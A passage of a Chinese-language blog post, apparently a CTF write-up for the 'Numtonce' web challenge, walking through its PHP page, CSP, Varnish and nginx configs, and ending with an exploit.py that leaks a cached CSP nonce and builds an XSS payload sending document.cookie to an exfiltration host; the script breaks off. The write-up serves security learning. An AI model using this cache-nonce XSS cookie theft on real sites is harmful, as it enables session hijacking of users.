class="attr">sprite</span>:<span class="string">"span"</span>,<span class="string">"data-uri"</span>:<span class="string">"span"</span>&#125;;<span class="keyword">return</span> n.prototype=&#123;<span class="attr">validate</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e,a,r</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> n.lastEmojiTerminatedAt=_+a,s&#125;<span class="keyword">var</span> n=<span class="keyword">this</span>,s=t(e);<span class="keyword">if</span>(s)&#123;<span class="keyword">var</span> l=e[<span class="number">0</span>],_=l.length;<span class="keyword">if</span>(<span class="number">0</span>===a)<span class="keyword">return</span> i();<span class="keyword">if</span>(r.length===l.length+a)<span class="keyword">return</span> i();<span class="keyword">var</span> c=<span class="keyword">this</span>.lastEmojiTerminatedAt===a;<span class="keyword">if</span>(c)<span class="keyword">return</span> i();<span class="keyword">if</span>(o(r.charAt(a<span class="number">-1</span>)))<span class="keyword">return</span> i();<span class="keyword">var</span> u=o(r.charAt(l.length+a));<span class="keyword">return</span> u&amp;&amp;c?i():<span class="keyword">void</span> <span class="number">0</span>&#125;&#125;&#125;,&#123;<span class="attr">defaultConfig</span>:d,<span class="attr">emojiNames</span>:g,<span class="attr">setConfig</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="built_in">Object</span>.keys(d).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;a <span class="keyword">in</span> e&amp;&amp;(d[a]=e[a])&#125;)&#125;,<span class="attr">replace</span>:s,<span class="attr">run</span>:l&#125;&#125;();<span class="keyword">return</span> e&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>favicon.ico</code>是一个图片。</p>
+</li>
+<li><p><code>index.php</code>的内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$nonce = bin2hex(openssl_random_pseudo_bytes(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'none'; script-src 'sha256-CRtdY47bt+vWDdsuOTTeizFLvSy49h32pVgpWlyN0TU=' 'nonce-$&#123;nonce&#125;'; img-src 'self'; style-src 'self'; base-uri 'none'; frame-ancestors 'none'; form-action 'none';"</span>);</span><br><span class="line">header(<span class="string">'Referrer-Policy: no-referrer'</span>);</span><br><span class="line">header(<span class="string">'X-Content-Type-Options: nosniff'</span>);</span><br><span class="line">header(<span class="string">'X-DNS-Prefetch-Control: off'</span>);</span><br><span class="line">header(<span class="string">'X-Download-Options: noopen'</span>);</span><br><span class="line">header(<span class="string">'X-Frame-Options: deny'</span>);</span><br><span class="line">header(<span class="string">'X-XSS-Protection: 1; mode=block'</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;Numtonce&lt;/title&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"/numtonce.css"</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;center&gt;</span><br><span class="line">            &lt;p&gt;enjoy this calm <span class="keyword">and</span> &lt;!--XSS--&gt;safe place :)&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;(you may also create your own)&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">            &lt;script nonce=<span class="string">"&lt;?=$nonce?&gt;"</span> src=<span class="string">"/emojify.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">            &lt;script&gt;</span><br><span class="line">                <span class="keyword">const</span> l=location</span><br><span class="line">                  let h=l.hash</span><br><span class="line">                  <span class="keyword">var</span> p=l.hostname</span><br><span class="line">                <span class="keyword">const</span> s=l.search</span><br><span class="line">                  let a=h.split(p)</span><br><span class="line">                  <span class="keyword">var</span> b=a.map((o,O)=&gt;(O^<span class="number">0</span>!==<span class="number">0</span>&amp;&amp;o||<span class="string">''</span>)).map(decodeURIComponent)</span><br><span class="line">                <span class="keyword">const</span> o0o=b.join(s)</span><br><span class="line">                  let script=sessionStorage[a[<span class="number">0</span>]]</span><br><span class="line">                  <span class="keyword">var</span> my=a=&gt;b</span><br><span class="line">                <span class="keyword">const</span> msg=<span class="string">'there is p'</span> in my `t<span class="string">'</span></span><br><span class="line"><span class="string">            ˂/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;script&gt;</span></span><br><span class="line"><span class="string">                o0o='</span>nope<span class="string">'</span></span><br><span class="line"><span class="string">            ˂/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            A wise man once said: '</span>A CSP a day keeps the XSS away.`</span><br><span class="line">        </span><br><span class="line">            &lt;script&gt;</span><br><span class="line">                document.write(<span class="string">'&lt;div id="garden"&gt;'</span>);</span><br><span class="line">                document.write(o0o||<span class="string">'tt t t t fnttttttttt nfst t ttt n t tl t  tnr tmtt dt n  cttttrttntt t tttttnttt   t t nt   tt tt nt  t  t  t'</span>.split(<span class="string">''</span>).map(c=&gt;(&#123;t:<span class="string">':evergreen_tree:'</span>,f:<span class="string">':fallen_leaf:'</span>,s:<span class="string">':squirrel:'</span>,l:<span class="string">':leaves:'</span>,r:<span class="string">':rabbit:'</span>,m:<span class="string">':maple_leaf:'</span>,d:<span class="string">':droplet:'</span>,c:<span class="string">':cherry_blossom:'</span>,n:<span class="string">'&lt;br/&gt;'</span>,<span class="string">' '</span>:<span class="string">':white_small_square:'</span>&#125;[c])).join(<span class="string">''</span>));</span><br><span class="line">                document.write(<span class="string">'&lt;/div&gt;'</span>);</span><br><span class="line"></span><br><span class="line">                emojify.setConfig(&#123; img_dir: <span class="string">'/emojis'</span> &#125;);</span><br><span class="line">                emojify.run(garden);</span><br><span class="line">            &lt;/script&gt;</span><br><span class="line">        &lt;/center&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="大体分析一下："><a href="#大体分析一下：" class="headerlink" title="大体分析一下："></a>大体分析一下：</h6><h6 id="3行随机生成一个32位的字符串。"><a href="#3行随机生成一个32位的字符串。" class="headerlink" title="3行随机生成一个32位的字符串。"></a><code>3</code>行随机生成一个32位的字符串。</h6><h6 id="5行设置了页面的字符集防止页面乱码。"><a href="#5行设置了页面的字符集防止页面乱码。" class="headerlink" title="5行设置了页面的字符集防止页面乱码。"></a><code>5</code>行设置了页面的字符集防止页面乱码。</h6><h6 id="6行设置页面的CSP，其中需要注意的是要在页面中执行javascript代码需要nonce的值相同。"><a href="#6行设置页面的CSP，其中需要注意的是要在页面中执行javascript代码需要nonce的值相同。" class="headerlink" title="6行设置页面的CSP，其中需要注意的是要在页面中执行javascript代码需要nonce的值相同。"></a><code>6</code>行设置页面的CSP，其中需要注意的是要在页面中执行<code>javascript</code>代码需要<code>nonce</code>的值相同。</h6><h6 id="7-12行设置一些请求头，大家感兴趣的自行了解。"><a href="#7-12行设置一些请求头，大家感兴趣的自行了解。" class="headerlink" title="7~12行设置一些请求头，大家感兴趣的自行了解。"></a><code>7~12</code>行设置一些请求头，大家感兴趣的自行了解。</h6><h6 id="49行将会在页面中输出验证通过的地址后面的标签如：http-123-57-232-69-8080-index-php-123-57-232-69-3Ch1-3Etest-3C-h1-3E。"><a href="#49行将会在页面中输出验证通过的地址后面的标签如：http-123-57-232-69-8080-index-php-123-57-232-69-3Ch1-3Etest-3C-h1-3E。" class="headerlink" title="49行将会在页面中输出验证通过的地址后面的标签如：http://123.57.232.69:8080/index.php#123.57.232.69%3Ch1%3Etest%3C/h1%3E。"></a><code>49</code>行将会在页面中输出验证通过的地址后面的标签如：<code>http://123.57.232.69:8080/index.php#123.57.232.69%3Ch1%3Etest%3C/h1%3E</code>。</h6><h6 id="其余没什么可以分析的了。"><a href="#其余没什么可以分析的了。" class="headerlink" title="其余没什么可以分析的了。"></a>其余没什么可以分析的了。</h6><ul>
+<li><code>numtonce.css</code>的内容如下：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">*, <span class="selector-tag">a</span>, <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>, <span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: monospace;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, #B5AC49, #3CA55C);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:first-of-type</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">2em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:last-of-type</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.6</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">3em</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#garden</span> &#123;</span><br><span class="line">    <span class="attribute">white-space</span>: pre;</span><br><span class="line">    <span class="attribute">user-select</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.emoji</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">3em</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">3em</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">background-size</span>: contain;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.emoji</span><span class="selector-attr">[alt=":white_small_square:"]</span> &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0.1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="cache目录下："><a href="#cache目录下：" class="headerlink" title="cache目录下："></a><code>cache</code>目录下：</h6><ul>
+<li><code>default.vcl</code>的内容如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">vcl 4.0;</span><br><span class="line"></span><br><span class="line">import std;</span><br><span class="line">import directors;</span><br><span class="line"></span><br><span class="line">backend default &#123;</span><br><span class="line">    .host = &quot;server&quot;;</span><br><span class="line">    .port = &quot;80&quot;;</span><br><span class="line">    .connect_timeout = 60s;</span><br><span class="line">    .first_byte_timeout = 60s;</span><br><span class="line">    .between_bytes_timeout = 60s;</span><br><span class="line">    .max_connections = 800;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"># ACL we&apos;ll use later to allow purges</span><br><span class="line">acl purge &#123;</span><br><span class="line">    &quot;localhost&quot;;</span><br><span class="line">    &quot;127.0.0.1&quot;;</span><br><span class="line">    &quot;::1&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sub vcl_backend_response &#123;</span><br><span class="line">    set beresp.ttl = 10m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">    # Allow purging</span><br><span class="line">    if (req.method == &quot;PURGE&quot;) &#123;</span><br><span class="line">        if (!client.ip ~ purge) &#123; # purge is the ACL defined at the begining</span><br><span class="line">            # Not from an allowed IP? Then die with an error.</span><br><span class="line">            return (synth(405, &quot;IP: &quot; + client.ip  +  &quot; is not allowed to send PURGE requests.&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        # If you got this stage (and didn&apos;t error out above), purge the cached result</span><br><span class="line">        return (purge);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # Only deal with &quot;normal&quot; types</span><br><span class="line">    if (req.method != &quot;GET&quot; &amp;&amp;</span><br><span class="line">        req.method != &quot;HEAD&quot; &amp;&amp;</span><br><span class="line">        req.method != &quot;PUT&quot; &amp;&amp;</span><br><span class="line">        req.method != &quot;POST&quot; &amp;&amp;</span><br><span class="line">        req.method != &quot;TRACE&quot; &amp;&amp;</span><br><span class="line">        req.method != &quot;OPTIONS&quot; &amp;&amp;</span><br><span class="line">        req.method != &quot;PATCH&quot; &amp;&amp;</span><br><span class="line">        req.method != &quot;DELETE&quot;) &#123;</span><br><span class="line">        /* Non-RFC2616 or CONNECT which is weird. */</span><br><span class="line">        return (pipe);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # Only cache static files</span><br><span class="line">    if (req.url !~ &quot;^[^?]*\.(bmp|css|gif|ico|jpeg|jpg|js|png|svg|svgz|webm|webp|woff|woff2|xml)$&quot;) &#123;</span><br><span class="line">        return (pass);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # Only cache GET or HEAD requests. This makes sure the POST requests are always passed.</span><br><span class="line">    if (req.method != &quot;GET&quot; &amp;&amp; req.method != &quot;HEAD&quot;) &#123;</span><br><span class="line">        return (pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return (hash);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_pipe &#123;</span><br><span class="line">    return (pipe);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_pass &#123;</span><br><span class="line">    #return (pass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># The data on which the hashing will take place</span><br><span class="line">sub vcl_hash &#123;</span><br><span class="line">    # Called after vcl_recv to create a hash value for the request. This is used as a key</span><br><span class="line">    # to look up the object in Varnish.</span><br><span class="line"></span><br><span class="line">    hash_data(req.url);</span><br><span class="line"></span><br><span class="line">    if (req.http.host) &#123;</span><br><span class="line">        hash_data(req.http.host);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        hash_data(server.ip);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># The routine when we deliver the HTTP request to the user</span><br><span class="line"># Last chance to modify headers that are sent to the client</span><br><span class="line">sub vcl_deliver &#123;</span><br><span class="line">    # Called before a cached object is delivered to the client.</span><br><span class="line"></span><br><span class="line">    # Add debug header to see if it&apos;s a HIT/MISS and the number of hits, disable when not needed</span><br><span class="line">    if (obj.hits &gt; 0) &#123;</span><br><span class="line">        set resp.http.Hit-Or-Miss = &quot;i guess they never miss huh?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # Remove some headers: PHP/Express/... version</span><br><span class="line">    unset resp.http.X-Powered-By;</span><br><span class="line"></span><br><span class="line">    # Remove some headers: Apache version &amp; OS</span><br><span class="line">    unset resp.http.Server;</span><br><span class="line">    unset resp.http.X-Drupal-Cache;</span><br><span class="line">    unset resp.http.X-Varnish;</span><br><span class="line">    unset resp.http.Via;</span><br><span class="line">    unset resp.http.Link;</span><br><span class="line">    unset resp.http.X-Generator;</span><br><span class="line"></span><br><span class="line">    return (deliver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="下面大概介绍一下这个配置文件："><a href="#下面大概介绍一下这个配置文件：" class="headerlink" title="下面大概介绍一下这个配置文件："></a>下面大概介绍一下这个配置文件：</h6><ul>
+<li><code>3~4</code>行导入配置所需的包。</li>
+<li><code>6~13</code>行声明并初始化一个后端对象。</li>
+<li><code>16~20</code>行创建一个地址列表，用于后面的判断，可以是域名或IP集合，我们可以用于指定某些地址的请求入口，防止恶意请求等。</li>
+<li><code>22~24</code>行设置文件的缓存时间。</li>
+<li><code>28~36</code>行匹配清理缓存的请求，匹配成功就清楚。</li>
+<li><code>39~49</code>行处理不正常的请求，并进入pipe非缓存模式。</li>
+<li><code>52~54</code>行处理可以缓存的文件类型。</li>
+<li><code>61</code>行上面都没有处理就用哈希缓存处理。</li>
+<li><code>64~66</code>行进入pipe非缓存模式。</li>
+<li><code>68~70</code>行不处理pass事件。</li>
+<li><code>73~84</code>行hash缓存模式，生成hash值作为缓存查找键名提取缓存内容，主要用于缓存hash键值处理，可使用hash_data(string) 指定键值组成结构，可在同一个页面通过IP或cookie生成不同的缓存键值。</li>
+<li><code>88~108</code>行客户端交付子程序，在vcl_backend_response子程序后调用（非pipe模式），或vcl_hit子程序后调用，可用于追加响应头信息，cookie等内容。</li>
+<li>参考链接</li>
+<li><a href="https://blog.51cto.com/yangshufan/2167039" target="_blank" rel="noopener">https://blog.51cto.com/yangshufan/2167039</a></li>
+<li><a href="https://blog.51cto.com/namesam/1908525" target="_blank" rel="noopener">https://blog.51cto.com/namesam/1908525</a></li>
+</ul>
+<h6 id="server目录下："><a href="#server目录下：" class="headerlink" title="server目录下："></a><code>server</code>目录下：</h6><ul>
+<li><p><code>default.conf</code>的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default;</span><br><span class="line">    index index.php index.html;</span><br><span class="line">    server_name server;</span><br><span class="line">    error_log  /dev/stdout;</span><br><span class="line">    access_log /dev/stdout;</span><br><span class="line">    root /app;</span><br><span class="line"></span><br><span class="line">    location ~ \.php &#123;</span><br><span class="line">        fastcgi_split_path_info ^(.+\.php)(/.+)$;</span><br><span class="line">        try_files $fastcgi_script_name =404;</span><br><span class="line">        fastcgi_pass app:9000;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name;</span><br><span class="line">        fastcgi_param PATH_INFO $fastcgi_path_info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>2</code>行服务器监听再80端口。</p>
+</li>
+<li><p><code>3</code>行如果用127.0.0.1发起请求会先访问到<code>/</code>地址然后回去查<code>/app/index.php</code>不匹配再查下一个。</p>
+</li>
+<li><p><code>9~18</code>行参考链接如下：</p>
+</li>
+<li><p><a href="https://blog.jjonline.cn/linux/218.html" target="_blank" rel="noopener">https://blog.jjonline.cn/linux/218.html</a></p>
+</li>
+</ul>
+<h6 id="docker-compose-yml的内容如下："><a href="#docker-compose-yml的内容如下：" class="headerlink" title="docker-compose.yml的内容如下："></a><code>docker-compose.yml</code>的内容如下：</h6><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.7'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  cache:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">varnish:6.3</span></span><br><span class="line"><span class="attr">    restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"><span class="attr">    depends_on:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">server</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">numtonce</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80:80"</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">./cache/default.vcl:/etc/varnish/default.vcl:ro</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">  server:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">nginx:alpine</span></span><br><span class="line"><span class="attr">    restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"><span class="attr">    depends_on:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">app</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">numtonce</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">./app:/app:ro</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">./server/default.conf:/etc/nginx/conf.d/default.conf:ro</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  app:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">php:7.3-fpm-alpine</span></span><br><span class="line"><span class="attr">    restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">numtonce</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">./app:/var/www/html:ro</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line"><span class="attr">  numtonce:</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">numtonce</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="最后是exploit-py"><a href="#最后是exploit-py" class="headerlink" title="最后是exploit.py:"></a>最后是<code>exploit.py</code>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">CHALLENGE_HOST = <span class="string">'numtonce.fluxfingersforfuture.fluxfingers.net'</span></span><br><span class="line">CHALLENGE_PORT = <span class="number">80</span></span><br><span class="line">EXFIL_BASE_HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">EXFIL_BASE_PORT = <span class="number">60003</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># cache a CSP nonce</span></span><br><span class="line">    unique = <span class="string">''</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    cached_url = <span class="string">'http://&#123;&#125;:&#123;&#125;/index.php/&#123;&#125;.css'</span>.format(CHALLENGE_HOST, CHALLENGE_PORT, unique)</span><br><span class="line">    r = requests.get(cached_url)</span><br><span class="line">    csp = r.headers[<span class="string">'content-security-policy'</span>]</span><br><span class="line">    nonce = re.match(<span class="string">r'.*nonce-([a-f0-9]+).*'</span>, csp).group(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">'&#123;&#125;&lt;script/nonce="&#123;&#125;"&gt;location="http://&#123;&#125;:&#123;&#125;/?flag="+encodeURIComponent(document.cookie)&lt;/script&gt;'</span>.format(CHALLENGE_HOST, nonce, EXFIL_BASE_HOST, EXFIL_BASE_PORT)</span><br><span class="line">    url = <span class="string">'&#123;&#125;#&#123;&#125;'</span>.format(cached_url, quote(payload))</span><br><span class="line">    </span><br><span class="line">    print(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    